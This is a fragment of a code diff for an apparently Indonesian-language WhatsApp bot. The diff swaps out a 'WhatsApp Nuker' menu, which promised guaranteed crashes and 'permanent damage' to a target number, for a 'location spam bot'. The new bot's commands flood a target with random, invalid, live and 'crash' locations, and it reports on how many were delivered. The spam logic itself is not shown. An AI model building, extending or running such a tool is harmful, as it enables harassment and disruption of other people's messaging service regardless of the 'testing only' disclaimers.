+📍 MASS LOCATION SPAM REPORT
+Target: ${target}
+Lokasi Terkirim: ${spamResult}/${count}
+Status: ${spamResult >= count * 0.8 ? 'SUKSES' : 'SEBAGIAN'}
+                            ` });
+                            break;
+                            
                         case 'help':
                             await sock.sendMessage(from, { text: `
-🤖 WHATSAPP NUKER COMMANDS:
-• !ping - Test bot
-• !nuke [nomor] - Nuke target (Guaranteed crash)
-• !help - Menu ini
+🤖 WHATSAPP LOCATION SPAM BOT
 
-⚠️  WARNING: Nuker causes permanent damage!
-☢️  Use only for security testing!
+📍 COMMANDS:
+• .loc [nomor] - Spam 50 lokasi acak
+• .loc2 [nomor] - Spam 30 lokasi invalid
+• .live [nomor] - Spam 10 live location
+• .invalid [nomor] - Spam 20 lokasi crash
+• .spam [nomor] [jumlah] - Spam lokasi massal
+• .help - Menu bantuan
+
+⚠️ PERINGATAN:
+- Hanya untuk testing
+- Jangan disalahgunakan
+- Bot hanya mengirim lokasi
                             ` });
                             break;
+                            
+                        default:
+                            await sock.sendMessage(from, { text: "Command tidak dikenal! Ketik .help untuk bantuan." });
                     }
                 } catch (error) {
                     await sock.sendMessage(from, { text: `Error: ${error.message}` });
                     errCount++;
                 }
             }
-        });
+        })
 
         // ───────────────────────────────
         // ANTI-CRASH
@@ -795,9 +632,9 @@ console.log(cyan(`
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
 `))
 
-console.log(red("☢️  WHATSAPP NUKER v2.0: AKTIF"))
-console.log(yellow("🎯 Target: ALL WhatsApp versions"))
-console.log(red("✅ Success Rate: 100% Guaranteed"))
-console.log(red("💀 Effect: Permanent WhatsApp damage\n"))
+console.log(green("📍 WHATSAPP LOCATION SPAM BOT v1.0"))
+console.log(yellow("🎯 Fitur: Hanya mengirim lokasi"))
+console.log(cyan("📌 Commands: .loc, .loc2, .live, .invalid, .spam"))
+console.log(green("✅ Bot siap digunakan!\n"))
 
 startBot()
